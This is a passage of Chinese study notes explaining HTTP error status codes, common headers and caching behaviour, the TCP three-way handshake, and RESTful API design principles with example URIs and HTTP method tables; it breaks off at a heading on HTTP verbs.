由于和被请求资源的当前状态之间存在冲突请求无法完成。只有在用户被认为能够解决冲突并且会重新提交新请求的情况下才允许使用这个代码。该响应应当包含足够的信息以便用户发现冲突的源头。
冲突通常发生于对PUT请求的处理中,例如在采用版本检查的环境下,某次PUT提交的对特定资源的修改请求所附带的版本信息与之前的某个(第三方)请求向冲突,那么此时服务器就应该返回一个409错误,告知用户请求无法完成。此时响应实体中很可能会包含两个冲突版本之间的差异比较,以便用户重新提交归并以后的新版本

410 Gone
被请求的资源在服务器上已经不再可用,而且没有任何已知的转发地址。这样的状况应当被认为是永久性的。拥有链接编辑功能的客户端应当在获得用户许可后删除所有指向这个地址的引用。如果服务器不知道或无法确定这个状况是否是永久的,那么就应该使用404状态码。除非额外说明,否则这个响应是可缓存的。
410响应的目的主要是帮助网站管理员维护网站,通知用户该资源已经不再可用,并且服务器拥有者希望所有指向这个资源的远端连接也被删除。这类事件在限时、增值服务中很普遍。同样410响应也被用于通知客户端在当前服务器站点上,原本属于某个个人的资源已经不再可用。当然是否需要把所有永久不可用的资源标记为'410 Gone'以及是否需要保持此标记多长时间,完全取决于服务器拥有者

411 Length Required "Content-Length"
服务器拒绝在没有定义Content-Length头的情况下接受请求。在添加了表明请求消息体长度的有效Content-Length头之后,客户端可以再次提交该请求

412 Precondition Failed
服务器在验证请求头字段中给出先决条件时,没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息(请求头字段数据)中设置先决条件,以此避免该请求方法被应用到其希望的内容以外的资源上

413 Request Entity Too Large
该请求提交的实体数据大小超过了服务器愿意或能够处理的范围,所以服务器拒绝处理当前请求。此种情况下服务器可关闭连接以免客户端继续发送此请求。
如果这个状况是临时的,服务器应当返回一个Retry-After的响应头,以告知客户端可以在多少时间以后重新尝试

414 Request-URI Too Long
URL太长服务器不会接受请求,当POST请求被转换为带有很长的查询信息的GET请求时就会发生这种情况
请求的URI长度超过了服务器能够解释的长度,因此服务器拒绝对该请求提供服务。
这比较少见,通常的情况包括:
1、本应使用POST方法的表单提交变成了GET方法,导致查询字符串(Query String)过长
2、重定向URI"黑洞",例如每次重定向把旧的URI作为新的URI的一部分导致在若干次重定向后URI超长
3、客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的URI,当GET后的参数超过某个数值后可能会产生缓冲区溢出,导致任意代码被执行。没有此类漏洞的服务器,应当返回414状态码

415 Unsupported Media Type
由于媒介类型不被支持,服务器不接受请求
对于当前请求的方法和所请求的资源,请求中提交的实体并不是服务器中所支持的格式,因此请求被拒绝

416 Requested Range Not Satisfiable
客户端请求部分文档,但是服务器不能提供被请求的部分
如果请求中包含了Range请求头,并且Range中指定的任何数据范围都与当前资源的可用范围不重合,同时请求中又没有定义If-Range请求头,那么服务器就应当返回416状态码。
假如Range使用的是字节范围,那么这种情况就是指请求指定的所有数据范围的首字节位置都超过了当前资源的长度。服务器也应当在返回416状态码的同时,包含一个Content-Range实体头,用以指明当前资源的长度。这个响应也被禁止使用multipart/byteranges作为其Content-Type

417 Expectation Failed
服务器不能满足客户在请求中指定的请求头
在请求头Expect中指定的预期内容无法被服务器满足或这个服务器是一个代理服务器,它有明显的证据证明在当前路由的下一个节点上,Expect的内容无法被满足

421 too many connections
从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常这里的IP地址指的是从服务器上看到的客户端地址(比如用户的网关或代理服务器地址)。在这种情况下,连接数的计算可能涉及到不止一个终端用户。

422 Unprocessable Entity
请求格式正确,但是由于含有语义错误,无法响应。(RFC 4918 WebDAV)

423 Locked
当前资源被锁定。(RFC 4918 WebDAV)

424 Failed Dependency
由于之前的某个请求发生的错误,导致当前请求失败,例如 PROPPATCH。(RFC 4918 WebDAV)

426 Upgrade Required
客户端应当切换到TLS/1.0。(RFC 2817)

451 Unavailable For Legal Reasons
该请求因法律原因不可用。(RFC 7725)

【 5xx: 服务器错误 】
这类状态码代表了服务器在处理请求的过程中有错误或异常状态发生,也有可能是服务器以当前的软硬件资源无法完成对请求的处理。
除非这是一个HEAD请求,否则服务器应当包含一个解释当前错误状态以及这个状况是临时的还是永久的解释信息实体。浏览器应当向用户展示任何在当前响应中被包含的实体。
这些状态码适用于任何响应方法

500 Internal Server Error
服务器遇到了一个未曾预料的状况导致无法完成对请求的处理。一般来说这个问题都会在服务器端的源代码出现错误时出现

501 Not Implemented
服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法,并且无法支持其对任何资源的请求

502 Bad Gateway
作为网关或代理工作的服务器尝试执行请求时,从上游服务器接收到无效的响应

503 Service Unavailable
由于临时的服务器维护或过载,服务器当前无法处理请求。这个状况是临时的并且将在一段时间以后恢复。如果能够预计延迟时间,那么响应中可以包含一个Retry-After头用以标明这个延迟时间。如果没有给出这个Retry-After信息,那么客户端应当以处理500响应的方式处理它。
503状态码的存在并不意味着服务器在过载的时候必须使用它。某些服务器只不过是希望拒绝客户端的连接

504 Gateway Timeout
网关超时.服务器充当网关或者代理的角色时,未能从上游服务器收到一个及时的响应
作为网关或代理工作的服务器尝试执行请求时未能及时从上游服务器(URI标识出的服务器,如HTTP、FTP、LDAP)或辅助服务器(如DNS)收到响应。
某些代理服务器在DNS查询超时时会返回400或者500错误

505 HTTP Version Not Supported
服务器不支持或拒绝支持在请求中使用的HTTP版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体

506 Variant Also Negotiates
由《透明内容协商协议》(RFC 2295)扩展,代表服务器存在内部配置错误:被请求的协商变元资源被配置为在透明内容协商中使用自己,因此在一个协商处理中不是一个合适的重点。

507 Insufficient Storage
服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。WebDAV(RFC 4918)

509 Bandwidth Limit Exceeded
服务器达到带宽限制。这不是一个官方的状态码,但是仍被广泛使用。

510 Not Extended
获取资源所需要的策略并没有被满足。(RFC 2774)

511 Network Authentication Required
用户需要提供身份验证来获取网络访问入口

600 Unparseable Response Headers
源站没有返回响应头部,只返回实体内容

【 响应头 】
响应头同样可用于传递一些附加信息,包含服务器类型,日期时间,内容类型和长度等

Response Headers
status: 200
content-type: application/javascript; charset=utf-8
date: Tue,07 Mar 2017 03:06:14 GMT
server: Domain Reliablity Server
content-length: 0
x-xss-protection: 1;mode=block
x-frame-options: SAMEORIGIN
alt-svc: quic=":443";ma=2592000;v="36,35,34"

常见的响应 Header
名称              作用
content-encoding  响应数据的压缩格式
content-length    响应数据的长度
content-language  语言环境
content-type      响应数据的类型
Date              服务器消息发送的时间
Age               经过的时间
Etag              被请求变量的实体值,用于判断请求的资源是否发生变化
Expires           缓存的过期时间
Last-Modified     该资源在服务器端最后被修改的时间
server            服务器的型号
Pragma            是否缓存(http1.0提出)
Cache-Control     是否缓存(http1.1提出)
Set-Cookie        设置Cookie
Server            后台服务器
Transfer-Encoding 取值一般为chunked,出现在Content-Length不能确定的情况下,表示服务器不知道响应板体的数据大小,一般同时出现Content-Encoding响应头
Location          重定向到另一个URL,如输入浏览器就输入baidu.com回车,会自动跳转到www.baidu.com就是通过这个响应头控制的

响应体
响应体即响应正文,也就是网页的正文内容,一般在响应头中会用Content-Length来明确响应体的长度,便于浏览器接收,对于大数据量的正文信息,也会使用chunked的编码方式

</pre><pre>

<h3>HTTP协议的头部字段</h3>
1、Accept
告诉WEB服务器接受什么介质类型,/ 表示任何类型,type/* 表示该类型下的所有子类型,type/sub-type

2、Accept-Charset
浏览器申明接收的字符集

Accept-Encoding:
浏览器申明接收的编码方法,通常指定压缩方法,是否支持压缩,支持什么压缩方法(gzip,deflate)

Accept-Language:
浏览器申明接收的语言
语言跟字符集的区别:中文是语言,中文有多种字符集,比如big5,gb2312,gbk等等

3、Accept-Ranges:
WEB服务器表明是否接受获取其某个实体的一部分(如文件的一部分)的请求。bytes表示接受,none表示不接受

4、Age:
当代理服务器用自己缓存的实体去响应请求时,用该头部表明该实体从产生到现在经过多长时间了

5、Authorization:
当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时,用该头部来回应自己的身份验证信息给WEB服务器

6、Cache-Control:
请求:
no-cache(不要缓存的实体,要求现在从WEB服务器去取)
max-age:(只接受 Age 值小于 max-age 值,并且没有过期的对象)
max-stale:(可以接受过去的对象,但是过期时间必须小于 max-stale 值)
min-fresh:(接受其新鲜生命期大于其当前 Age 跟 min-fresh 值之和的缓存对象)
响应:
public(可以用 Cached 内容回应任何用户) private(只能用缓存内容回应先前请求该内容的那个用户)
no-cache(可以缓存,但是只有在跟WEB服务器验证了其有效后,才能返回给客户端)
max-age:(本响应包含的对象的过期时间) ALL: no-store(不允许缓存)

Cache-control是HTTP消息头中用来控制网页缓存的,常见的取值有private、no-cache、max-age、must-revalidate等,默认为private
1、打开新窗口:(target="_blank"),值为private、no-cache、must-revalidate,那么打开新窗口访问时都会重新访问服务器
   如果指定max-age值 Cache-control: max-age=60(表示当访问此网页后的1分钟内再次访问不会去服务器)
2、在地址栏回车进入:
   值为private或must-revalidate时,则仅首次访问时会访问服务器,以后就不再访问;
   值为no-cache,那么每次都会访问;
   值为max-age,则在过期之前不会重复访问
3、按后退按钮:值为private、must-revalidate、max-age,则不会重访问;值为no-cache,则每次都重复访问
4、刷新操作无论怎么设置都会重复访问。只不过当Cache-control值为"no-cache"时,访问此页面不会在Internet临时文章夹存储备份
可以通过设置Expires值来影响缓存,如果服务器上的网页经常变化,可以把值设置为-1,立即过期,
如果网页每天早上8点更新,可以把Expires设置为第二天的早上8点

7、Connection:
请求:
close(告诉WEB服务器或者代理服务器,在完成本次请求的响应后,断开连接,不要等待本次连接的后续请求了)
keepalive(告诉WEB服务器或者代理服务器,在完成本次请求的响应后,保持连接,等待本次连接的后续请求) 响应:
close(连接已经关闭) keepalive(连接保持着,在等待本次连接的后续请求)
Keep-Alive:如果浏览器请求保持连接,则该头部表明希望 WEB 服务器保持连接多长时间(秒)。例如:Keep-Alive:300

8、Content-Encoding:
WEB服务器表明自己使用了什么压缩方法(gzip,deflate)压缩响应中的对象。例如:Content-Encoding:gzip

9、Content-Language:
WEB服务器告诉浏览器自己响应的对象的语言

10、Content-Length:
WEB服务器告诉浏览器自己响应的对象的长度。例如:Content-Length: 26012

11、Content-Range:
WEB服务器表明该响应包含的部分对象为整个对象的哪个部分。例如:Content-Range: bytes 21010-47021/47022

12、Content-Type:
WEB服务器告诉浏览器自己响应的对象的类型。例如:Content-Type:application/xml

13、ETag:
就是一个对象(如URL)的标志值,一个对象比如一个 html 文件,如果被修改了,其 Etag 也会别修改,
所以ETag 的作用跟 Last-Modified 的作用差不多,主要供 WEB 服务器判断一个对象是否改变了
比如前一次请求某个 html 文件时,获得了其 ETag,当这次又请求这个文件时,
浏览器就会把先前获得的 ETag 值发送给WEB 服务器,然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比,然后就知道这个文件有没有改变了

14、Expired:
WEB服务器表明该实体将在什么时候过期,对于过期了的对象,只有在跟WEB服务器验证了其有效性后,才能用来响应客户请求。是 HTTP/1.0 的头部。例如:Expires:Sat, 23 May 2009 10:02:12 GMT

15、Host:
客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号。例如:Host:rss.sina.com.cn

16、if-Match:
如果对象的 ETag 没有改变,其实也就意味著对象没有改变,才执行请求的动作

17、if-None-Match:
如果对象的 ETag 改变了,其实也就意味著对象也改变了,才执行请求的动作

18、if-Modified-Since:
如果请求的对象在该头部指定的时间之后修改了,才执行请求的动作(比如返回对象),
否则返回代码304,告诉浏览器 该对象没有修改。例如:if-Modified-Since:Thu, 10 Apr 2008 09:14:42 GMT

19、if-Unmodified-Since:
如果请求的对象在该头部指定的时间之后没修改过,才执行请求的动作(比如返回对象)

20、if-Range:
浏览器告诉WEB服务器,如果请求的对象没有改变,就把我缺少的部分给我,
如果对象改变了,就把整个对象给我。浏览器通过发送请求对象的ETag或者自己所知道的最后修改时间给 WEB 服务器,让其判断对象是否改变了。总是跟 Range 头部一起使用

21、Last-Modified:
WEB 服务器认为对象(如文件)的最后修改时间,如动态页面的最后产生时间等等

22、Location:
WEB服务器告诉浏览器试图访问的对象已经被移到别的位置,到该头部指定的位置去取,如:Location:http://i0.sinaimg.cn/dy.gif

23、Pramga:
主要使用 Pramga: no-cache,相当于 Cache-Control: no-cache。例如:Pragma:no-cache

24、Proxy-Authenticate: 代理服务器响应浏览器,要求其提供代理身份验证信息
Proxy-Authorization:浏览器响应代理服务器的身份验证请求,提供自己的身份信息

25、Range:
浏览器(比如 Flashget 多线程下载时)告诉 WEB 服务器自己想取对象的哪部分。例如:Range: bytes=1173546-

26、Referer:
浏览器向WEB服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL

27、Server: WEB服务器表明自己是什么软件及版本等信息

28、User-Agent: 浏览器表明自己的身份(是哪种浏览器)

29、Transfer-Encoding:
WEB服务器表明自己对本响应消息体(不是消息体里面的对象)编码方式,如是否分块(chunked)例如:Transfer-Encoding: chunked

30、Vary:
WEB server用该头部的内容告诉 Cache 服务器,在什么条件下才能用本响应所返回的对象响应后续的请求
假如源WEB服务器在接到第一个请求消息时,其响应消息的头部为:Content- Encoding: gzip; Vary: Content-Encoding
那么 Cache 服务器会分析后续请求消息的头部,检查其 Accept-Encoding,是否跟先前响应的 Vary 头部值一致,
即是否使用相同的内容编码方法,可以防止Cache服务器用自己Cache里面压缩后的实体响应给不具备解压能力的浏览器
例如:Vary:Accept-Encoding

31、Via:
列出从客户端到OCS或者相反方向的响应经过了哪些代理服务器,他们用什么协议(和版本)发送的请求
当客户端请求到达第一个代理服务器时,该服务器会在自己发出的请求里面添 加 Via 头部,并填上自己的相关信息,
当下一个代理服务器收到第一个代理服务器的请求时,会在自己发出的请求里面复制前一个代理服务器的请求的Via 头部,并把自己的相关信息加到后面,以此类推,
当 OCS 收到最后一个代理服务器的请求时,检查 Via 头部,就知道该请求所经过的路由
例如:Via:1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13)

</pre>

<h3>TCP的三次握手</h3><pre>
三次握手流程的本质可以这么理解:TCP的三次握手其实是双方各一次握手,各一次确认,只是其中一次握手和确认合并在一起。

更通俗的理解:
"喂,你听得到吗？"
"我听得到呀,你听得到我吗？"
"我能听到你"

次握手为什么不用两次或者四次?
原因很简单,因为只有三次才是最合适的,三次通信是最小值,两次通信满足不了要求,而四次通信则显得冗余

第一次握手:Client将标志位SYN置为1,随机产生一个值seq=J,并将该数据包发送给Server,Client进入SYN_SENT状态,等待Server确认。

第二次握手:Server收到数据包后由标志位SYN=1知道Client请求建立连接,Server将标志位SYN和ACK都置为1,ack=J+1,随机产生一个值seq=K,并将该数据包发送给Client以确认连接请求,Server进入SYN_RCVD状态。

第三次握手:Client收到确认后,检查ack是否为J+1,ACK是否为1,如果正确则将标志位ACK置为1,ack=K+1,并将该数据包发送给Server,Server检查ack是否为K+1,ACK是否为1,如果正确则连接建立成功,Client和Server进入ESTABLISHED状态,完成三次握手,随后Client与Server之间可以开始传输数据了。

</pre>
</div>

<div id="restful">
<h2>restful API设计</h2><pre>
SDK是Software Development Kit的缩写,即软件开发工具包,通常所说的SDK编程就是直接调用API函数进行编程

调用api的过程就是用钥匙开门的过程。
而sdk则是把这些钥匙串在一块儿,将api集成在一块儿。拥有sdk便可以在该房子里畅通无阻,想要获得哪个房间里的资源,用手中的钥匙打开房门进去拿取即可。

Api又分为open api和私有api。Open api即是向所有人公开的接口,允许任何人调用它并获取到它背后的数据。它就好比于图书馆,只需要进行相应的身份认证,就可以进入里面获取到相应的图书及资源,而身份认证便是获取资源的钥匙。

现在很多公司都开放自己的open api,并为了用户调用方便,大多采用sdk文档方式打包。用户在调用时只需要下载该sdk文档,根据相应规范进行调用即可。这样就省去了重写函数去封装http、https等请求的工作,节省更多时间去做更有价值的事情。

sdk和api的区别
例如一个简单的功能链条将它分为三个组成部分:
1、客户端组装数据
2、客户端使用组装的数据来请求服务端(或者操作系统)的 api
3、服务端(或者操作系统)的 api 处理数据并返回处理结果

结合这个链条得出结论:
1、api为细粒度的功能接口
2、sdk包含第2、3步
3、sdk为api的集合

RESTful架构是目前最流行的一种互联网软件架构,结构清晰、符合标准、易于理解、扩展方便,所以正得到越来越多网站的采用
github api: https://api.github.com/

【 restfull限制及其优点 】
1.客户端-服务器(Client-Server)分离
优点
提高用户界面的便携性,操作简单
通过简化服务器提高可伸缩性,高性能,低成本
允许组件分别优化,可以让服务端和客户端分别进行改进和优化

2.无状态(Stateless): 从客户端的每个请求要包含服务器所需要的所有信息
优点
提高可见性,可以单独考虑每个请求
提高可靠性,更容易从局部故障中修复
提高可扩展性,降低了服务器资源使用

3.缓存(Cachable): 服务器返回信息必须被标记是否可以缓存,如果缓存客户端可能会重用之前的信息发送请求。
优点
减少交互次数
减少交互的平均延迟

4.分层系统(Layered System): 系统组件不需要知道与其交流组件之外的事情。封装服务,引入中间层。
优点
限制了系统的复杂性
提高可扩展性

5.统一接口(Uniform Interface)
优点
提高交互的可见性
鼓励单独改善组件

6.支持按需代码(Code-On-Demand 可选)
优点
提高可扩展性

restful解决的问题:
1、降低开发的复杂性
2、提高系统的可伸缩性

API
Application Programming Interface,应用程序编程接口
比如腾讯、阿里巴巴可以提供一个接口API,然后其他公司可以编一个软件去跟这个API进行相连或交互
比如可以用手机软件分享内容到微信朋友圈或新浪微博,这些软件就是与微信和微博的api进行了交互

REST
Resource Representational State Transfer,表现层状态转化,资源在网络中以某种表现形式进行状态转移
Resource:资源,即数据(网络的核心),比如newsfeed、friends等
Representational:某种表现形式,比如用JSON、XML、JPEG等
State Transfer:状态变化,通过HTTP动词实现

例如订阅了一个人的博客,想要获取其发表的所有文章(资源Resource),于是就向他的服务发出请求,要求是atom格式的,这时候服务器返回atom格式的文章列表第一页,这里atom格式的文章列表就是表征Representation。
看到了第一页的页尾时想要看第二页,如果服务器记录了应用的状态(stateful),那么只要向服务请求下一页服务器就会返回第二页,但是REST的服务器是无状态的(stateless),服务器并没有保持你当前处于第几页,也就无法响应下一页这种具有状态性质的请求。因此客户端需要去维护当前应用的状态(application state),也就是如何获取下一页资源。
当然下一页资源的业务逻辑必然是由服务端来提供,服务器在文章列表的atom表征中加入一个URI超链接(hyper link)指向下一页文章列表对应的资源。客户端就可以使用统一接口(Uniform Interface)的方式,从这个URI中获取到他想要的下一页文章列表资源。
服务器把『能够进入下一页』这个状态State以atom表征形式传输(Transfer)给客户端就是表征状态传输(REpresentational State Transfer)

【 资源(Resources) 】
资源就是一个标识单位,是网络上的一个实体或一个具体信息,可以是一段文本、一张图片、一首歌曲、一种服务,总之就是一个具体的实在,任何可以被访问或被远程操纵的东西都可能是一个资源。

在服务器端应用程序状态和功能可以分为各种资源,资源是一个概念实体,向客户端公开,资源的例子有:应用程序对象、数据库记录、算法等
每个资源都使用URI(Universal Resource Identifier)得到一个唯一的地址。
所有资源都共享统一的接口,以便在客户端和服务器之间传输状态。

资源可以是静态的,即该资源的状态永远不会改变,相反某些资源的状态可能随着时间推移呈现很大的可变性,这两种类型的资源都是有效的
可以用一个URI(Universal Resource Identifier统一资源定位符)指向资源,每种资源对应一个特定的URI。要获取这个资源,访问它的URI就可以,因此URI就成了每一个资源的地址或独一无二的识别符。URI提供了Web通用的识别机制,包含了客户端直接与被引用的资源进行交互时需要的所有信息。所谓上网就是与互联网上一系列的资源互动,调用它的URI

作为资源标识的URI最好具有可读性,因为具有可读性的URI更容易被使用,使用者一看就知道被标识的是何种资源
http://www.example.com/employees/c001     # 编号C001的员工
http://www.example.com/sales/2015/12/31   # 2015年12月31日的销售额
http://www.example.com/orders/2015/q4     # 2015年第4季度签订的订单

使用链接关联相关的资源
在绝大多数情况下资源并不会孤立地存在,必然与其它资源具有某种关联。既然推荐资源采用具有可寻址性的URI来标识,那么就可以利用它来将相关的资源关联起来。超链接常被客户端用于资源导航。
http://www.eurekao.com/hotel/656bcee2-28d2-404b-891b/Room/4
http://www.eurekao.com/hotel/656bcee2-28d2-404b-891b/Room/4/Reservation/15
可以通过URI获取指定的Room,也可以获取Room下的Reservation(预定)

【 表现层(Representation) 】
资源是一种信息实体,可以有多种外在表现形式。资源具体呈现出来的形式叫表现层(Representation)
比如文本可以用txt格式表现,也可以用HTML格式、XML格式、JSON格式表现,甚至可以采用二进制格式;图片可以用JPG格式表现,也可以用PNG格式表现。
URI只代表资源的实体,不代表它的形式。严格地说,有些网址最后的".html"后缀名是不必要的,因为这个后缀名表示格式,属于表现层范畴,而URI应该只代表资源的位置。它的具体表现形式应该在HTTP请求的头信息中用Accept和Content-Type字段指定,这两个字段才是对表现层的描述

【 RESTful架构 】
REST是一种软件架构风格,而不是标准,一个符合REST约束条件和原则的架构就是RESTful架构,核心是面向资源
REST通常基于HTTP,URI和JSON以及HTML这些现有的广泛流行的协议和标准
RESTful web服务在设计上依赖于HTTP,使用HTTP来实现两个系统之间通信,restful规定URL标识资源,使用Http的四个方法对资源进行操作,使用HTTP响应代码来通知用户请求是否成功

传统网页是前端后端融在一起的,比如典型的PHP或JSP架构,在之前的桌面时代问题不大,但是近年来移动互联网的发展,各种类型的Client终端多样化,Server可以通过一套统一的RESTful API接口为Web,iOS和Android提供服务,Web端和Server只使用上述定义的API来传递数据和改变数据状态,格式一般是JSON,而前端渲染和附带处理简单的业务逻辑,web、ios、android、pc浏览器、手机浏览器、软件app不同的终端作为同等公民申请调用同一个后端server提供的API接口
Facebook platform、微博开放平台、微信公共平台等不需要有显式的前端,只需要一套提供服务的接口,于是RESTful更是最好的选择

看Url就知道要什么
看http method就知道干什么
看http status code就知道结果如何

(1)每一个URI代表一种资源;
(2)客户端和服务器之间,传递这种资源的某种表现层;
(3)客户端通过使用标准的四个HTTP方法(动词)对服务器端资源进行操作,实现表现层状态转化,GET获取资源,POST新建或更新资源,PUT更新资源,DELETE删除资源

访问一个网站就代表了客户端和服务器的一个互动过程,互联网通信协议HTTP协议是一个无状态协议,这意味着所有的状态都保存在服务器端。
Web应用程序最重要的REST原则是客户端和服务器之间的交互在请求之间是无状态的。从客户端到服务器的每个请求都必须包含理解请求所必需的信息。如果服务器在请求之间的任何时间点重启,客户端不会得到通知。此外无状态请求可以由任何可用服务器回答,这十分适合云计算之类的环境,客户端可以缓存数据以改进性能。

REST设计概念和准则:
1、网络上的所有事物都被抽象为资源(resource),所有的接口设计都是针对资源来设计的
2、每个资源对应一个唯一的资源标识(resource identifier)
3、通过通用的连接器接口(generic connector interface)对资源进行操作
4、对资源的各种操作不会改变资源标识
5、所有的操作都是无状态的(stateless)服务端生成响应客户端请求的数据中包含状态转移的数据,客户端借助这份数据可以进行状态转移,例如获取列表的下一页
< a rel="next" href="/yasserg/crawler4j/issues?page=2&q=is%3Aissue+is%3Aopen">
另一个状态(下一页连接)和状态转移的方向next(表示连接为下一页)都有服务器生成存放在客户端
由于REST强制所有的操作都必须是stateless的,这就没有上下文的约束,如果做分布式,集群都不需要考虑上下文和会话保持的问题。极大的提高系统的可伸缩性

【 统一资源接口 】
统一接口包含一组受限的操作,由它们进行资源的访问和操作,不论什么资源都使用相同的接口。
由于REST是面向资源的,所以一个Web API旨在实现针对单一资源的操作,针对资源的基本操作唯CRUD而已,这使得为Web API定义标准接口成可能。
所谓的标准接口就是针对不同资源的Web API定义一致性的操作来操作它们,其接口可以采用类似于下面的模式。
class MenuController extends BaseController{
     public function Get(){}
     public function Create(Resource resource){}
     public function Update(Resource resource){}
     public function Delete(string id){}
}

【 使用标准的HTTP方法 】
由于RESTful Web API采用了统一的接口,所以其成员体现为针对同一资源的操作。对于Web来说针对资源的操作通过HTTP方法来体现。应该将两者统一起来,使Web API分别针对CRUD的操作只能接受具有对应HTTP方法的请求

重要方法  典型用法        安全  幂等         典型状态码
GET      获取资源(缓存)   是   是           200(OK) – 表示已在响应中发出
                                           204(无内容) – 资源有空表示
                                           301(Moved Permanently) – 资源的URI已被更新
                                           303(See Other) – 其他(如,负载均衡)
                                           304(not modified)- 资源未更改(缓存)
                                           400(bad request)- 指代坏请求(如,参数错误)
                                           404(not found)- 资源不存在
                                           406(not acceptable)- 服务端不支持所需表示
                                           500(internal server error)- 通用错误响应
                                           503(Service Unavailable)- 服务端当前无法处理请求

DELETE  删除资源          否   是           200(OK)- 资源已被删除
                                           301(Moved Permanently)- 资源的URI已更改
                                           303(See Other)- 其他,如负载均衡
                                           400(bad request)- 指代坏请求t
                                           404(not found)- 资源不存在
                                           409(conflict)- 通用冲突
                                           500(internal server error)- 通用错误响应
                                           503(Service Unavailable)- 服务端当前无法处理请求

PUT                      否   是           200(OK)- 如果已存在资源被更改
用客户端管理的实例号创建一个资源             201(created)- 如果新资源被创建
通过替换的方式更新资源                      301(Moved Permanently)- 资源的URI已更改
如果未被修改,则更新资源(乐观锁)              303(See Other)- 其他(如,负载均衡)
                                          400(bad request)- 指代坏请求
                                          404(not found)- 资源不存在
                                          406(not acceptable)- 服务端不支持所需表示/p>
                                          409(conflict)- 通用冲突
                                          412(Precondition Failed)- 前置条件失败(如执行条件更新时的冲突)
                                          415(unsupported media type)- 接受到的表示不受支持
                                          500(internal server error)- 通用错误响应
                                          503(Service Unavailable)- 服务当前无法处理请求

POST                     否 否
使用服务端管理的(自动产生)的实例号创建资源  200(OK)- 如果现有资源已被更改
创建子资源                               201(created)- 如果新资源被创建
部分更新资源                             202(accepted)- 已接受处理请求但尚未完成(异步处理)
如果没有被修改,则不过更新资源(乐观锁)     301(Moved Permanently)- 资源的URI被更新
                                        303(See Other)- 其他(如,负载均衡)
                                        400(bad request)- 指代坏请求
                                        404(not found)- 资源不存在
                                        406(not acceptable)- 服务端不支持所需表示
                                        409(conflict)- 通用冲突
                                        412(Precondition Failed)- 前置条件失败(如执行条件更新时的冲突)
                                        415(unsupported media type)- 接受到的表示不受支持
                                        500(internal server error)- 通用错误响应
                                        503(Service Unavailable)- 服务当前无法处理请求

1、POST方法
通常用于创建新资源,特别是用于创建从属资源,即从属于某些其他资源(如父资源)
当创建一个新的资源时,父服务负责将新的资源与父资源关联,分配一个ID即新的资源URI
成功创建后返回HTTP状态201(Created),返回一个包含具有201状态的新创建资源链接的Location头
POST既不安全也不幂等,因此建议对非幂等资源请求。进行两个相同的POST请求将很可能导致包含相同信息的两个资源。

例子:
POST http://www.example.com/customers
POST http://www.example.com/customers/12345/orders

2、GET方法
用于读取或检索资源,返回XML或JSON及一个200(OK)的HTTP响应代码,错误时通常返回404(NOT FOUND)或400(BAD REQUEST)
GET(和HEAD)请求仅用于读取资源数据而不改变它,因此使用这种方式是安全幂等的,即使多个相同的请求最终具有与单个请求相同的结果。
不要通过GET暴露不安全的操作

例子:
GET http://www.example.com/customers/12345
GET http://www.example.com/customers/12345/orders
GET http://www.example.com/buckets/sample

3、PUT方法
PUT通常用于更新功能,PUT到已知资源URI,请求主体包含原始资源的新更新的表示。
在资源ID由客户端而不是由服务器选择的情况下,PUT也可以用于创建资源,请求主体包含资源表示
或者,使用POST创建新资源并在正文表示中提供客户端定义的ID - 可能是不包括资源ID的URI(请参POST)。

成功更新后从PUT返回200,如果未返回正文中的任何内容,则返回204。
如果使用PUT进行创建,则在成功创建时返回HTTP状态201。响应中的主体是可选的。由于客户端已经设置了资源ID,因此没有必要通过创建案例中的Location头返回链接。

PUT不是一个安全的操作,因为它修改(或创建)服务器上的状态,但它是幂等的,即如果使用PUT创建或更新资源,然后再次进行同样的调用,资源仍然存在,并且仍然具有与第一次调用时相同的状态。

例如,如果对资源调用PUT增加资源内的计数器,则调用不再是幂等的。有时这种情况发生,它可能足以记录呼叫不是幂等的。但是,建议保持PUT请求幂等。强烈建议对非等幂请求使用POST。

例子:
PUT http://www.example.com/customers/12345
PUT http://www.example.com/customers/12345/orders/98765
PUT http://www.example.com/buckets/secret_stuff

4、DELETE方法
用于删除由URI标识的资源。
成功删除后返回HTTP状态200以及响应正文(可能是已删除项的表示或包装响应),或者返回HTTP状态204(NO CONTENT),没有响应正文

DELETE操作是幂等的。如果删除资源,对该资源重复调用DELETE结果相同:资源消失。
如果调用DELETE在资源内递减计数器则DELETE调用不再是幂等的

例子:
DELETE http://www.example.com/customers/12345
DELETE http://www.example.com/customers/12345/orders
DELETE http://www.example.com/bucket/sample

</pre>

<h3>best practices: 设计符合RESTful要求server API</h3><pre>
restful api其实就是接口文档的一种表现形式,可以方便前后端分离,能够让前端后端更方便的交流,最后可以让前端和后端同时开发

1、REST描述的是在网络中client和server的一种交互形式;REST本身不实用,实用的是如何设计RESTful API

2、URL root
尽量将API部署在专属域名下,https://api.github.com,假如API很简单不会有扩展,则可以放到主域名下,https://www.github.com/api
API versioning可以放在URL里面,这个域名后面加上版本控制的信息,方便接口升级及迁移
版本号也可以在HTTP请求头信息header的Accept字段中进行区分
Accept: vnd.example-com.foo+json; version=1.0
Accept: vnd.example-com.foo+json; version=1.1
Accept: vnd.example-com.foo+json; version=2.0

GET http://api.xxx.com/v1/article?limit=10
这个域名地址就包含了几个内容,第一个是采用GET的形式去请求接口,第二个是主域名地址是http://api.xxx.com,第三个信息是版本号是v1,第四个信息是访问article的接口,第五个信息是返回十条数据。
所以从这一个域名就大约知道了这个接口干什么事情了,这就是REST API接口设计思想的最大魅力

3、资源是REST架构或者说整个网络处理的核心。
在Server提供的RESTful API架构中,RESTful web服务是一些指向一个或多个资源的URI(统一资源标识符)的集合,每个终点、端点(Endpoint,API的具体网址路径)代表一种资源(resource),所以网址中不能有动词,只能有名词,而且所用的名词往往与数据库的表格名对应。一般来说,数据库中的表都是同种记录的"集合"(collection),所以API中的名词也应该使用复数。

资源的地址推荐用嵌套结构
GET /friends/10375923/profile
UPDATE /profile/primaryAddress/city

HTTP动词
